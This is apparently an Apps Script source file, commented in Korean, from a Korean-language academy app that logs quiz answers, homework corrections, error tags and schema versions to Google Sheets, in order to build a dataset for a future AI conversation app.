// SYNK 엔진 분할부 — 학습 데이터 수집 — 퀴즈 응답 로그·숙제 문항 연결·재작성문·오류 태그·회화 로그.
// 원본은 Code.js 단일 파일이었다. 로드 순서 정본 = .clasp.json filePushOrder(상수 정본 Code.js가 선두).
//
/* ═══════════════════ [v9.138] 이 파일이 존재하는 이유 ═══════════════════
 * 유호님 확정 계획: **개원 후 2년간 학원 앱으로 학습 데이터를 축적 → 그 데이터로 AI 한국어 회화 앱 출시.**
 * 즉 이 앱은 운영 도구이면서 동시에 **수집기**다. 그런데 08-03 실측에서 새는 곳이 드러났다:
 *
 *   ① 퀴즈 — 문항 100개를 매일 카드로 띄우는데 **학생이 무엇을 골랐는지 저장하는 곳이 없었다.**
 *      정답은 버튼이 열어주고 끝. 2년이면 수만 번의 선택이 통째로 허공으로 간다.
 *   ② 숙제 — 폼이 자유 텍스트라 **210개 문항 풀과 제출문이 연결돼 있지 않았다.**
 *      어느 과제가 어떤 오류를 유발하는지 영원히 알 수 없다.
 *   ③ 첨삭 — 원문·교정문은 남지만 오류 유형이 **자연어 문장으로만** 남아 집계가 불가능했다.
 *
 * 설계 원칙 3개 (여기 있는 모든 함수가 따른다):
 *   🔑 **수집이 채점보다 우선.** 채점은 틀려도 나중에 다시 할 수 있지만, 안 받아둔 응답은 영원히 없다.
 *      그래서 채점 실패는 행을 버리는 사유가 되지 않는다 — 원문을 적재하고 판정만 비운다.
 *   🔑 **문항 텍스트를 함께 스냅샷한다.** contents는 개정된다. ID만 저장하면 2년 뒤 "QZ31에 뭘 물었더라"가
 *      되어 데이터가 통째로 해석 불능이 된다. 지금 묻고 있는 문장을 그 자리에 박아 둔다.
 *   🔑 **Glide update 0.** 입구는 전부 Google Form이다(행 추가는 update를 안 먹는다).
 *      월 500 update 제약이 출시 최대 리스크라, 수집 때문에 운영이 죽으면 본말전도다.
 * ═══════════════════════════════════════════════════════════════════ */

/* [v9.207] 행 단위 스키마 판 — 수집 3시트(hw_feedback·quiz_log·talk_log) 공용.
 * 근거 = 코어엔진 부록 A-8, **2026-08-05 유호님 확정 「넣어」**(🚫제거 재제안 금지 · 소급 불가).
 *
 * 왜 행에 박나: 3·4년차에 한 시트 안에 c8·c10·c12 행이 섞이면 **어느 규격인지 행이 스스로 말하지 못한다.**
 *   변환기를 쓰려 해도 대상을 못 고른다 — 불변식 1(「4년 호환」)을 지키는 유일한 기계 장치가 이 한 칸이다.
 *   계약 파일에는 판이 있었지만 **데이터 행에는 없었다**(2026-08-11 실측: 이 저장소 코드층 `schema_ver` 매치 0).
 *   과거 행은 영원히 빈칸이라 지금 박는 것 말고 방법이 없다(학생 0명인 지금이 손실 0의 마지막 창).
 *
 * ⚠ 정본은 이 상수가 아니라 `계약/수집_교정_계약.json` 의 `버전` 이다. GAS는 JSON을 import 못 해
 *   여기 있는 것은 **손사본**이고, 사본은 언젠가 갈라진다.
 * 🔴 **그 갈라짐을 막던 기계는 지금 없다 — 그리고 실제로 갈라졌다**(2026-08-24 실측).
 *   이 자리는 `tests/계약.test.js` 가 상수와 계약 `버전` 을 대조해 지켰는데, 그 파일은 08-19 대청소
 *   (`e75fc7fc` 「자기검증 층 철거」 · 유호 지시)로 지워졌다. 그때 도구층 다섯 파일(`계약동봉`·`문법뱅크`·
 *   `계약동기화`·`계약동봉검사`·`문법급수계약`)의 언급에는 「(⚠삭제됨 …)」가 붙었는데 **이 줄만 안 고쳐져**
 *   「기계로 막는다」가 사실인 채로 남았고,
 *   그 사이 계약이 c12(08-21)·c13(08-22)로 두 판 오르는 동안 이 상수는 c11 에 머물렀다.
 *   지금 이 저장소에 남은 계약 검사는 `tools/계약동봉검사.js`(`픽스처_항목필드` ↔ 픽스처 조립부) 하나뿐이고
 *   **판 번호는 그 검사의 과녁이 아니다**(`tools/계약동기화.js` 도 파일을 형제와 같은 바이트로 맞출 뿐
 *   이 상수는 안 본다). 새 검사는 세우지 않는다(「고치고 끝낸다」 · 부채 기록 = `docs/_ops/트랙.md` §6) —
 *   대신 **계약 판을 올리는 손이 이 줄을 같이 고친다.** 그게 원래 그 검사가 하던 일이다.
 * ⚠ **판을 올릴 때마다 시트 형상을 다시 재고 그 결과를 여기 남긴다** — 「가산 개정이라 옛 형상 행도 유효」는
 *   판마다 새로 재야 하는 말이지 한 번 적어 물려주는 말이 아니다(c11 줄이 그렇게 물려받아 두 판을 건너뛰었다).
 *   · **c12**(08-21 상태기반 과제선택): payload 3칸(`generation_outcome`·`generation_gate_failed`·
 *     `generation_input_text`)은 jsonb **안** · `assignment_status` 는 /tasks **응답** 최상위 칸 ·
 *     `payload_허용필드` 는 검증기 화이트리스트. 셋 다 시트 열이 아니다(계약 자신도 「물리 0」이라 적었다).
 *   · **c13**(08-22 성향 확인 되돌려주기): `event_type` +1(`estimate.responded`) + payload 6칸. 사건층이다.
 *   · 기계 대조(08-24) — 계약이 「라이브 시트에 대응 열이 있다」고 못박은 목록 `learning_events.라이브_대응`
 *     **14칸이 c11 과 c13 에서 한 글자도 다르지 않다**(`오류태그` 24 · `골든판정` 3 · `픽스처_최상위필드` 5 ·
 *     `task_type` 9 도 동일). c11→c13 사이 이 저장소가 따라가야 했던 형상 변화는 `픽스처_항목필드` +`대안태그`
 *     하나뿐이고 **그건 v9.220 에 이미 착지**했다(동봉 가드가 지키는 자리다).
 *     이 저장소 코드층에 `learning_events`·`event_type` 생산자는 **0**(엔진으로 나가는 통로는 명부 스윕
 *     `엔진_운영배치.js:498` → `engine.learners` 하나 · 들어오는 통로 0), 수집 4시트 헤더에도 새 이름이 안 닿는다.
 *   ⇒ **c11 형상으로 쓰이던 행이 c13 에서도 그대로 유효**하다. 그래서 헤더·골격은 안 건드리고 이 상수만 올린다.
 *   · **c14**(08-31 교실 수집 ②·① · 유호 확정 「웅 그대로 가」): `event_type` +2(`goal.responded`·
 *     `observation.noted`) + payload 5칸(목표 3·관찰 3 중 tags 는 선택) + 물리칸 2 + RLS 재정의 —
 *     **전부 talk DB(learning_events) 층**이다. 기계 대조(08-31): `learning_events.라이브_대응` 14칸 ·
 *     `오류태그` 24 · `골든판정` 3 · `task_type` 9 전부 c13 과 한 글자도 다르지 않다(내 개정이 그
 *     목록들을 안 건드렸다 — diff 로 쟀다). 이 저장소의 생산자 0·수집 4시트 헤더 무접촉도 그대로.
 *   ⇒ **c13 형상 행이 c14 에서도 그대로 유효** — 상수만 올린다.
 * ⚠ 옛 행에 소급 기입하지 않는다 — 그때 무슨 규격이었는지 지금 알 길이 없고, 지어 넣으면 복원이 아니라 날조다. */
const SCHEMA_VER = 'c16'; // 09-02 c16 판올림 동행(접기 어휘 fold_date·promote_ver 는 talk DB 층 — 시트 형상 무변)

/* ──────────────── ⓪ 숙제 첨삭 — 3단 데이터 + 오류 태그 어휘 ──────────────── */

/* [v9.138] hw_feedback 헤더 단일 정본 — 구 구조는 시트 골격(sheetSkeleton_)과 배치(aiFeedbackBatch_의
 *   ensureSheet)가 **각자 배열을 들고** 있어, 한쪽만 고치면 조용히 갈라진다(teacher_stats가 v9.40에서
 *   정확히 그렇게 3열 vs 8열로 벌어져 있었다). 새 열은 **끝에만** 붙인다 — 읽기 폭이 9·10·11로 고정된
 *   소비처 4곳이 인덱스로 접근하므로, 중간 삽입은 첨삭 카드 내용을 통째로 한 칸씩 밀어버린다.
 *
 * 뒤 4열이 「2년 축적 → AI 회화 앱」의 실제 재료다:
 *   숙제ID    — 어느 과제가 어떤 오류를 부르는지. 구 폼은 자유 텍스트라 210문항과 끊겨 있었다(교재 개정 근거이기도 하다)
 *   오류태그  — 같은 API 호출에서 함께 받는다(추가 비용 ≈ 0). 자연어 설명만으로는 3만 건을 집계할 수 없다
 *   재작성원본 — 이 제출이 어떤 첨삭에 대한 **2차 시도**인지. 원문→교정→재작성 3단이 여기서 조인으로 복원된다
 *   다시쓰기URL — 그 2차 시도로 들어가는 입구(스크립트가 채운다)
 *
 * [v9.187] 맨 뒤 4열 — 스키마 감사(제품방향 §설계 불변식 2 「학생·레벨·시점을 키로」)가 잡은 구멍. 전부 소급 불가 계열:
 *   숙제문항  — 문항 **텍스트** 스냅샷. 이 파일 머리의 원칙 2를 quiz_log만 지키고 여기는 ID만 남기고 있었다
 *               (contents가 개정되면 "그날 무엇을 시켰는지"가 해석 불능이 된다). 재작성 행은 빈칸(원본 첨삭에서 조인).
 *   급수      — 제출 시점의 학생 급수(profiles BO67 스냅샷). profiles는 현재값이라 승급하면 과거가 지워지고,
 *               academic_log 'level'은 강사 월 1회 입력이라 월 정밀도+입력 의존 — 행에 박아야 확실하다.
 *   model·prompt_ver — 교정문은 모델 출력물이다. talk_log가 v9.145에서 넣은 근거(「학생이 어려워한 것」과
 *               「그때 우리 답이 나빴던 것」이 섞인다)가 원문↔교정 병렬쌍인 여기에 더 강하게 적용된다. */
const HW_FEEDBACK_HEADERS = ['id', 'student_id', '제출일', '제출문', '고친문장', '오늘의포인트', '칭찬', '다음미션',
  '상태', '학생확인', '포인트지급', '숙제ID', '오류태그', '재작성원본', '다시쓰기URL',
  '숙제문항', '급수', 'model', 'prompt_ver', 'schema_ver']; // [v9.207] schema_ver — A-8(유호 확정) · 끝에만 붙인다

/* [v9.210] hw_feedback I열(상태) 판정 **단일 정본** — 이종 검수 P1(#9136f31e61a9) 이 잡은 자리.
 *
 * I열 어휘는 닫혀 있다: `노출`=공개(게이트 통과) · `대기`=수동 검수 모드에서 승인 대기 ·
 * `격리:`/`오류:`=미노출. 그런데 소비처가 **두 방언**으로 갈려 있었다(2026-08-11 전수 실측):
 *   · 허용목록(노출만 통과) — sweepFeedbackAck_ · 엔진_수집 994 · Code 3839  → 닫히는 쪽으로 샌다
 *   · 거부목록(오류·격리 접두만 차단) — 약점맵 2051 · 오류사전 2172 · 성장카드 Code 2536 → **열리는 쪽으로 샌다**
 * 거부목록은 `대기` 를 통과시킨다. `AI_FEEDBACK_AUTOPUBLISH=false`(구 검수 모드로 되돌리는 폴백 ·
 * Code.js 그 상수 주석이 명시한 출구)로 가는 순간, **검토자가 승인하지 않은 카드**의 손메모·오류태그가
 * 약점맵→AI 퀴즈·오류사전·성장카드로 흘러든다. 사람이 눌러 넘기는 칸은 검수 확정 하나뿐인데,
 * 그 문을 우회하는 경로가 셋이었다. 지금은 그 상수가 true 라 `대기` 행이 안 생겨 **새고 있지는 않다** —
 * 그러나 폴백이 안전장치인데 그 안전장치를 켜는 순간 새는 구조다.
 *
 * 🔑 그래서 호출부마다 고치지 않고 판정을 **여기 하나**로 옮긴다(같은 판정을 여섯 곳에 적으면 갈라지고,
 *   갈라지는 방향은 언제나 「통과」다). 옛 거부목록 표기는 회귀가 금지한다.
 * ⚠ 빈 상태(옛 행)는 **미노출로 친다** — 게이트를 통과한 적 없는 행이고, 틀릴 때 방향이
 *   「재료가 준다」이지 「승인 안 된 것이 학생에게 간다」가 아니다. */
function 노출카드_(상태) {
  return String(상태 || '') === '노출';
}

/* [v9.211]→[v9.212] 「닫힘」 판정 — 커서·재시도 로직이 이 행을 **지나가도 되는가**. 노출카드_(노출 여부)와 축이 다르다:
 * `오류:` 는 재시도 무의미가 확정된 행이라 즉시 닫힘. `격리:` 는 즉시 닫힘이 **아니다** — fbQualityGate_ 가
 * 「오탐은 '노출'로 바꿔 복구」를 야간 메일로 안내하는 **사람 확인 대기** 상태고, 커서(②G)는 카드 생성과
 * 같은 밤에 돌므로 즉시 닫힘이면 다음 날 아침의 복구가 전부 커서 뒤 = error_bank 영구 누락이다(v9.211
 * 재검수 P1 ×4 · af5a106f507d 계열 — v9.210 이 「대기」에서 닫은 것과 같은 문이 격리에 남아 있었다).
 * 그래서 격리는 복구 창 안에서는 판정 전(멈춤=지연)이고, 창이 지나면 닫힘이다 — 무기한 멈춤도 답이 아니다:
 * 정당한 격리(불량 카드)는 사람이 안 치우는 것이 정상 동작이라 커서가 영원히 서고, error_bank 가 통째로 굶는다.
 * 대기·빈칸·낯선 값·앞뒤 공백은 닫힘이 아니다 — 틀릴 때 방향이 「유실」이 아니라 「지연」이어야 한다. */
const 격리복구창_MS = 7 * 86400000; // 야간 메일 복구 안내의 유예 — 창 안의 격리 앞에서 커서가 기다린다(메일 문구도 이 상수에서 파생)
function 닫힌카드_(상태, 제출일, 기준시각) {
  const s = String(상태 == null ? '' : 상태).trim();
  if (s.indexOf('오류') === 0) return true;
  if (s.indexOf('격리') === 0) {
    const d = 제출일 instanceof Date ? 제출일 : (제출일 ? toDate_(제출일) : null);
    if (!d || isNaN(d.getTime())) return true; // [v9.213] 날짜를 못 읽는 격리(빈칸·Invalid Date)는 기다릴 기준이 없다 — NaN 비교로 흘리면 커서가 영구 정지한다(재검수 P2 0d609066a254). 정체(전량 굶김)가 한 행 유실보다 나쁘다
    return (Number(기준시각) - d.getTime()) >= 격리복구창_MS;
  }
  return false;
}

/* 오류 태그 통제 어휘 — **자유 문자열이면 같은 오류가 열 가지 이름으로 쌓여 태그를 넣은 의미가 사라진다.**
 * JSON schema의 enum으로 모델에 강제하고, 집계도 이 상수를 읽는다(어휘와 집계가 갈라지지 않게).
 * 축의 근거: 몽골어 화자가 한국어에서 무너지는 지점은 대부분 ①조사 체계 ②활용/불규칙 ③높임 등급이다
 *   (몽골어도 SOV라 어순은 상대적으로 안전하다 — 그래서 어순은 1칸이면 충분하고 조사는 7칸을 준다).
 * ⚠ 이 목록을 고치면 **과거 데이터와 어휘가 갈라진다.** 늘리는 것은 안전하지만 이름 변경·삭제는
 *   2년치 집계를 깨뜨린다 — 바꿔야 한다면 새 태그를 추가하고 옛 태그는 남겨 둔다. */
const HW_ERROR_TAGS = [
  '조사:주격(이/가·은/는)', '조사:목적격(을/를)', '조사:처소(에·에서)', '조사:여격(에게·한테)',
  '조사:도구·방향(로/으로)', '조사:접속(와/과·하고)', '조사:기타',
  '어미:시제', '어미:연결어미', '어미:불규칙활용', '어미:종결',
  '높임:주체', '높임:상대(존댓말 등급)',
  '어휘:유의어혼동', '어휘:연어(자연스러운 짝)', '어휘:없는말',
  '맞춤법:받침', '맞춤법:띄어쓰기', '맞춤법:기타',
  '어순', '누락:필수성분', '중복:불필요',
  /* c5 추가 — 문화적 무례·과도한 직설("이거 줘요"). 🔴`높임:상대`(존댓말 **등급**)와 다른 실패다:
   * 등급은 맞는데 무례한 문장이 존재한다("주세요"는 해요체지만 부탁 상황에선 무례하다).
   * 축이 없으면 그 오류들은 전부 다른 태그로 뭉개져 영원히 집계 밖에 남는다. */
  '화용:공손성',
  '오류없음'
];

/* 모델이 돌려준 태그를 어휘로 자른다 — schema enum이 1차 방어지만, 응답이 어긋나도
 * 시트에 정체불명 문자열이 쌓이는 것보다 버리는 편이 낫다(집계가 오염되면 되돌리기 어렵다). */
function hwTagsClean_(tags) {
  if (!tags || !tags.length) return '';
  const ok = {};
  HW_ERROR_TAGS.forEach(t => { ok[t] = 1; });
  const out = [];
  [].concat(tags).forEach(t => {
    const s = String(t || '').trim();
    if (ok[s] && out.indexOf(s) === -1) out.push(s);
  });
  return out.join(', ');
}

/* [v9.187] 공용 헤더 치유 — 이미 서 있는 시트에 새 열의 이름표를 붙인다(멱등·값 불변).
 * `ensureSheet`는 시트가 **없을 때만** 헤더를 쓰므로, 라이브 시트에 열을 늘리면 반드시 이 통로를 지나야 한다 —
 * 없으면 appendRow가 시트 폭을 넘는 칸을 조용히 버려, 새 열이 **적재되는 척하며 사라진다**.
 * 같은 로직이 hw·talk 두 벌로 갈라져 있던 것을 급수 열 추가(수집 4시트 동시)를 계기로 한 벌로 모았다
 * — 헤더 정본 배열이 유일한 입력이라, 정본을 고치면 치유도 같이 움직인다. */
function 헤더보정_(sh, HEADERS) {
  const need = HEADERS.length;
  if (sh.getMaxColumns() < need) sh.insertColumnsAfter(sh.getMaxColumns(), need - sh.getMaxColumns());
  const cur = sh.getRange(1, 1, 1, need).getValues()[0];
  HEADERS.forEach((h, i) => {
    if (String(cur[i] || '').trim() !== h) sh.getRange(1, i + 1).setValue(h);
  });
}

/* 기존 hw_feedback을 정본 폭으로 증분 — 이름은 소비처 4곳이 불러서 유지, 본체는 공용 치유로. */
function hwFeedbackEnsureCols_(fb) {
  헤더보정_(fb, HW_FEEDBACK_HEADERS);
}

/* 「다시 써보기」 링크 — 학생ID + 원본 첨삭 id를 함께 프리필한다.
 * 틀이 없으면(폼 마이그레이션 전) 빈칸 — 링크 없는 카드는 구 동작 그대로다. */
function hwRedoUrlOf_(tmpl, sid, fbId) {
  if (!tmpl || !sid || !fbId) return '';
  return String(tmpl).replace(/SIDTOKEN/g, encodeURIComponent(sid)).replace(/REDOTOKEN/g, encodeURIComponent(fbId));
}

/* [v9.138] ▶ 1회 — 이미 만들어진 숙제 폼에 수집 문항 2개를 증분 추가한다.
 * createHwForm은 formAlreadyMade_ 가드로 **재실행 시 아무것도 하지 않으므로**, 라이브 폼은 영원히 구 2문항으로 남는다
 *   (동의 문구가 v9.103 전까지 라이브에 안 닿던 것과 같은 계급의 구멍이다).
 * 설계: ① 멱등 — 같은 제목이 있으면 스킵 ② 두 문항 모두 **선택 응답** — 필수로 만들면 이미 배포된
 *   구 프리필 링크(숙제ID 없이 열리는)가 전부 제출 불가가 된다 ③ URL 틀 2종을 여기서 재생성한다
 *   (기본 링크 = 학생ID+숙제ID / 다시쓰기 링크 = 학생ID+재작성원본). */
function migrateHwFormV9138() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const st = ensureSheet(ss, 'app_state', ['key', 'value']);
  const fid = String(getState(st, '숙제폼ID').val || '');
  if (!fid) { const m = '⚠️ 숙제폼ID 미연결 — createHwForm ▶ 먼저 실행하세요'; Logger.log(m); return m; }
  const out = [];
  try {
    const form = FormApp.openById(fid);
    const titles = form.getItems().map(x => String(x.getTitle()).trim());
    if (titles.indexOf('숙제ID') === -1) {
      form.addTextItem().setTitle('숙제ID').setRequired(false)
        .setHelpText('앱에서 열었다면 자동으로 채워져 있어요 — 비워 두셔도 제출됩니다');
      out.push('숙제ID: 추가(선택 응답)');
    } else out.push('숙제ID: 이미 있음 — 스킵');
    if (titles.indexOf('재작성원본') === -1) {
      form.addTextItem().setTitle('재작성원본').setRequired(false)
        .setHelpText('첨삭 카드의 「다시 써보기」로 들어왔다면 자동으로 채워져 있어요 — 처음 내는 숙제라면 비워 두세요');
      out.push('재작성원본: 추가(선택 응답)');
    } else out.push('재작성원본: 이미 있음 — 스킵');
    // URL 틀 2종 — 문항이 생긴 **뒤에** 만들어야 프리필 자리가 잡힌다
    setState(st, '숙제폼URL틀', prefillTemplate2_(form, '학생ID', '숙제ID', 'QZTOKEN'));
    setState(st, '숙제폼재작성틀', prefillTemplate2_(form, '학생ID', '재작성원본', 'REDOTOKEN'));
    out.push('URL 틀 2종 갱신 — 다음 calcAll부터 학생 행에 반영됩니다');
  } catch (e) { out.push('⚠️ 폼 접근 실패 — 숙제폼ID/권한 확인: ' + e); }
  const report = '📝 숙제 폼 수집 문항(v9.138)\n' + out.join('\n')
    + '\n\n이 두 문항이 하는 일: ①어느 과제가 어떤 오류를 부르는지 연결 ②원문→교정→재작성 3단 데이터'
    + '\n다음: calcAll ▶ → hw_feedback 「다시쓰기URL」 열에 학생별 주소가 채워집니다 — 새 앱 첨삭 카드의 「다시 써보기」 버튼이 그 열을 씁니다.';
  Logger.log(report);
  if (quotaOk(1)) MailApp.sendEmail(ADMIN_EMAIL, '[SYNK] 📝 숙제 폼 수집 문항 추가(v9.138)', report);
  return report;
}

/* ───────────────────────── ① 퀴즈 응답 로그 ───────────────────────── */

/* 문항 텍스트·정답을 행에 함께 박는다(위 원칙 2). '확신도'는 소요 시간의 대체재 —
 * 폼으로는 초를 잴 수 없지만, 맞았는지보다 **얼마나 확신했는지**가 회화 앱 개인화에 더 쓸모 있다
 * (정답이어도 '찍었어요'면 모르는 것이고, 오답인데 '확실해요'면 잘못 배운 것이다 — 둘은 처방이 다르다). */
/* ⚠ '유형' 칸에 실리는 값은 contents의 C열(분류: 문법 카테고리)이다 — contents B열(유형='quiz')이 아니다.
 *   이름이 어긋나 있지만 라이브 헤더 개명은 Glide 바인딩·과거 데이터와 어긋날 위험만 있고 값은 멀쩡하므로
 *   여기 주석으로 못박는다(2년 뒤 조인할 사람이 헤더 이름만 믿지 않게). — 구 Glide(08-05 폐기 · 이관 = docs/글라이드_이관대장.md)
 * [v9.187] '급수'(맨 끝) — 응답 시점의 학생 급수 스냅샷(제품방향 §불변식 2 「학생·레벨·시점」의 레벨 축).
 *   profiles는 현재값이라 승급하면 과거 응답의 난이도 맥락이 지워진다 — 행에 박아야 남는다. */
const QUIZ_LOG_HEADERS = ['id', 'student_id', '퀴즈ID', '유형', '문제', '고른답', '정답', '정답여부', '확신도', '제출일', 'created_at', '급수', 'schema_ver', '시도', '문항지문', '스냅샷지연초',
  '응답시각ms']; // [v9.312] 폼이 찍은 응답 시각(epoch ms) — 같은 원본 행을 다시 읽는 «재처리»를 가르는 정체(코덱스 09-06 3차 P1) · 사람이 읽는 날짜는 제출일이 쥔다
const QUIZ_CONFIDENCE = ['확실해요', '아마도', '찍었어요'];
/* 확신도 도움말 — 생성부와 migrateFormCopy0901 이 **같은 상수**를 본다(WORK_DESC 관례 · 두 곳에 적으면 갈린다). */
const QUIZ_CONFIDENCE_HELP = '솔직하게 골라주세요 — 찍었다고 해서 불이익은 전혀 없고, 오히려 다음 문제를 더 잘 맞춰 드려요';

/* 채점 정규화 — 원문자·공백·문장부호를 걷어낸다. 학생이 '①'로 쓰든 '1'로 쓰든 '1 번'으로 쓰든 같은 답이다. */
function quizNorm_(s) {
  return String(s == null ? '' : s)
    .replace(/[①②③④⑤]/g, m => String('①②③④⑤'.indexOf(m) + 1))
    .replace(/번째|번/g, '')
    .replace(/[\s.,·、，。!?！？'"'"「」（）()]/g, '')
    .toLowerCase();
}

/* 정답 문자열 → 허용 답 후보들.
 * contents의 정답부는 '① 에 — 방향·도착점은 에' 처럼 [핵심 — 해설] 형태가 많다. 해설은 채점 대상이 아니다.
 * 또 '의사 또는 간호사'처럼 복수 정답이 한 칸에 들어오기도 한다. */
function quizAnswerKeys_(correctRaw) {
  const raw = String(correctRaw || '').trim();
  if (!raw) return [];
  const head = raw.split(/[—–]/)[0].trim();     // em/en dash만 해설 구분자로 본다(하이픈은 답 안에 올 수 있다)
  const keys = {};
  const add = v => { const n = quizNorm_(v); if (n) keys[n] = 1; };
  head.split(/\s*또는\s*|\s*\/\s*/).forEach(part => {
    add(part);
    const m = String(part).match(/^([①②③④⑤]|\d)\s*(.*)$/); // '① 에' → 번호만·답만도 정답으로 받는다
    if (m) { add(m[1]); if (m[2]) add(m[2]); }
  });
  add(head);
  return Object.keys(keys);
}

/* 채점 — { ok: true|false|null, keys }. null = 판정 보류(정답 미등록·무응답).
 * 보류를 false(오답)로 뭉개면 2년치 정답률이 조용히 왜곡된다 — 모르는 것과 틀린 것은 다르다. */
function quizGrade_(ans, correctRaw) {
  const keys = quizAnswerKeys_(correctRaw);
  const a = quizNorm_(ans);
  if (!keys.length || !a) return { ok: null, keys: keys };
  return { ok: keys.indexOf(a) !== -1, keys: keys };
}

/* [v9.138] 🧠 오늘의 퀴즈 응답 폼 — 카드가 묻기만 하던 것을 받아 적는다.
 * 학생ID·퀴즈ID를 프리필로 받는 이유: 학생이 자기 ID를 손으로 치게 하면 오타가 곧 데이터 유실이고,
 *   퀴즈ID가 없으면 "무엇에 대한 답인지" 모르는 답만 쌓인다(구 숙제폼이 정확히 그 상태였다).
 * 재실행 안전 — formAlreadyMade_ 가드(구 폼 URL이 죽고 유령 응답 시트가 쌓이는 것을 막는다). */
function createQuizForm() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const doneQ = formAlreadyMade_(ss, '퀴즈폼_응답', '퀴즈폼URL틀', '퀴즈폼ID', '학생ID', '퀴즈 응답 폼');
  if (doneQ) return doneQ;
  const before = ss.getSheets().map(s => s.getName());
  const form = FormApp.create('SYNK 오늘의 퀴즈')
    .setDescription('오늘의 퀴즈에 답해 보세요 — 맞고 틀리고보다, 무엇을 골랐는지가 다음 수업을 만듭니다 🧠')
    .setCollectEmail(false);
  setState(ensureSheet(ss, 'app_state', ['key', 'value']), '퀴즈폼ID', form.getId()); // [v9.94 패턴] 생성 즉시 기록 — 뒤 단계가 타임아웃돼도 폼을 잃지 않는다
  form.addTextItem().setTitle('학생ID').setRequired(true).setHelpText('앱에서 열었다면 자동으로 채워져 있어요');
  form.addTextItem().setTitle('퀴즈ID').setRequired(true).setHelpText('앱에서 열었다면 자동으로 채워져 있어요 — 오늘 카드에 뜬 문제 번호입니다');
  form.addTextItem().setTitle('내 답').setRequired(true).setHelpText('번호(①/1)로 답해도 되고, 단어로 답해도 됩니다');
  // 확신도는 필수다 — 선택으로 두면 대부분 비게 되고, 그러면 이 축이 있으나 마나가 된다
  form.addMultipleChoiceItem().setTitle('얼마나 확신하나요?').setRequired(true)
    .setChoiceValues(QUIZ_CONFIDENCE)
    .setHelpText(QUIZ_CONFIDENCE_HELP);
  form.setDestination(FormApp.DestinationType.SPREADSHEET, ss.getId());
  linkFormTab_(ss, before, '퀴즈폼_응답');
  const st = ensureSheet(ss, 'app_state', ['key', 'value']);
  setState(st, '퀴즈폼ID', form.getId());
  setState(st, '퀴즈폼URL틀', prefillTemplate2_(form, '학생ID', '퀴즈ID'));
  Logger.log('✅ 퀴즈 응답 폼 생성 완료! 다음 calcAll부터 profiles 퀴즈폼URL 열에 학생별 링크가 채워집니다.');
  Logger.log('편집용: ' + form.getEditUrl());
  return '퀴즈 응답 폼 생성 완료 — 학생별 주소가 다음 calcAll부터 profiles 「퀴즈폼URL」 열에 채워집니다. 지금은 그 주소를 학생에게 직접 주고(수업 중 QR·채팅), 새 앱이 서면 「퀴즈 답하기」 버튼에 잇습니다.';
}

/* 두 필드 프리필 틀 — prefillTemplateOf_(1개)의 확장. SIDTOKEN + 지정 토큰 자리를 치환해 쓴다.
 * 한 필드씩 두 번 만들면 두 URL이 되어 합칠 수 없다(프리필은 응답 1벌 단위로 직렬화된다).
 * token2를 인자로 받는 이유: 같은 폼에서 용도가 다른 링크를 두 벌 뽑기 때문이다
 *   (숙제 폼 = 기본 링크에 숙제ID / 다시쓰기 링크에 재작성원본 — 토큰이 같으면 서로를 덮어쓴다). */
function prefillTemplate2_(form, title1, title2, token2) {
  const items = form.getItems();
  const i1 = items.find(i => i.getTitle() === title1);
  const i2 = items.find(i => i.getTitle() === title2);
  return form.createResponse()
    .withItemResponse(i1.asTextItem().createResponse('SIDTOKEN'))
    .withItemResponse(i2.asTextItem().createResponse(token2 || 'QZTOKEN'))
    .toPrefilledUrl();
}

/* 숙제 폼 기본 링크 — 숙제ID는 **선택**이라 없어도 링크를 준다(그날 게시된 숙제가 없을 수 있고,
 * 무엇보다 숙제 제출 자체를 막으면 안 된다). 퀴즈와 규칙이 다른 이유가 여기 있다:
 * 퀴즈는 "무엇에 답했는지 모르는 답"이 무가치하지만, 숙제는 문장 자체가 이미 자산이다. */
function hwFormUrlOf_(tmpl, sid, hwId) {
  if (!tmpl || !sid) return '';
  return String(tmpl).replace(/SIDTOKEN/g, encodeURIComponent(sid)).replace(/QZTOKEN/g, encodeURIComponent(hwId || ''));
}

/* ──────────────── ③ AI 한국어 대화 — 회화 앱의 1세대이자 수집기 ──────────────── */

/* [v9.138] 🗣 「한국어로 말 걸기」 — 2년 뒤 만들 회화 앱을 **지금 허접하게 열어** 2년간 고친다.
 *
 * 정직하게 말하면 이것은 실시간 음성 회화가 아니라 **비동기 AI 펜팔**이다. 이 플랫폼에서 실시간은
 *   만들 수 없다 — 웹앱(HtmlService) 경로는 익명 google.script.run 브릿지 때문에 보안 철회됐고
 *   (`_보류_두뇌_웹화면.js`), Glide는 월 500 update 상한이 있어 왕복 대화를 감당하지 못한다. — 구 Glide(08-05 폐기 · 이관 = docs/글라이드_이관대장.md)
 * 그런데 목표 관점에서는 오히려 이 형태가 맞다:
 *   ① **없던 데이터를 만든다.** 지금 쌓이는 것은 전부 단문·단답이라 「대화」가 0건이었다. 회화 앱을
 *      만들겠다면서 다회차 주고받기가 한 건도 없는 상태였다 — 이 구멍이 숙제·퀴즈보다 크다.
 *   ② 즉답이 아니라 **생각하고 쓴다.** 학습 효과가 오히려 높고, 비용·상한 통제가 쉽다.
 *   ③ 2년 뒤 처음 만드는 대신 **2년간 고친 것**을 내놓게 된다(데이터 결함은 쓸 때 드러난다).
 *
 * 안전: CLAUDE_API_KEY 없으면 0초 스킵 · 리허설이면 입구 차단(비용 0) · 학생당 하루 1턴 ·
 *   실행당 상한 · 응답은 시트에만 쓴다(외부 발송 0). */
/* [v9.145] 뒤 2열(`model`·`prompt_ver`)은 **소급 불가 항목**이라 학생이 쓰기 전에 넣는다.
 * 왜 필요한가: 이 데이터의 값은 「몽골어 화자가 어디서 무너지는지의 지도」인데(아래 커버리지 리포트 주석),
 *   2년간 프롬프트·모델을 바꿔가며 쌓으면 **「학생이 어려워한 것」과 「그때 우리 답이 나빴던 것」이 한 덩어리로 섞인다.**
 *   섞이면 지도가 틀어지고, 무엇으로 만든 답인지는 **되돌아가 알 수 없다**(원본 음성 보관과 같은 계열).
 * [v9.151] `audio_ref`(맨 끝) — 음성 원본 참조(Drive 파일ID 등). 보존 정책 = **무제한**(유호 확정 2026-08-04 ·
 *   판정 정본 = memory masterplan-v3-2026-08-04). 텍스트 폼 수집인 지금은 빈칸이고, 회화 앱(SYNK-talk)이
 *   녹음을 시작하는 날부터 원본 참조가 여기 착지한다 — 원본 없이 전사만 남기면 윗줄의 「원본 음성 보관」
 *   소급 불가가 그대로 실현된다(동의 문구는 이미 녹음 수집을 약속했다 — 약속만 있고 데이터가 없던 구멍).
